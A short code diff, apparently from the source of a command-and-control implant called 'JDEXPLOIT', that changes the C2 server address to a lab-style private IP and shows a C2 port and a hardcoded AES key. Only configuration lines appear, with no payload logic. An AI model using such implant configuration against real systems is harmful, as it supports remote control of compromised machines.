@@ -23,7 +23,7 @@
 #pragma comment(lib, "uuid.lib")
 
 // --- CONFIGURACIÓN JDEXPLOIT ---
-#define C2_SERVER L"192.168.254.147"
+#define C2_SERVER L"10.10.14.227"
 #define C2_PORT 443
 #define AES_KEY "JDEXPLOIT2024!!!"
 #define AES_BLOCK_SIZE 16  // AES block size is always 16 bytes
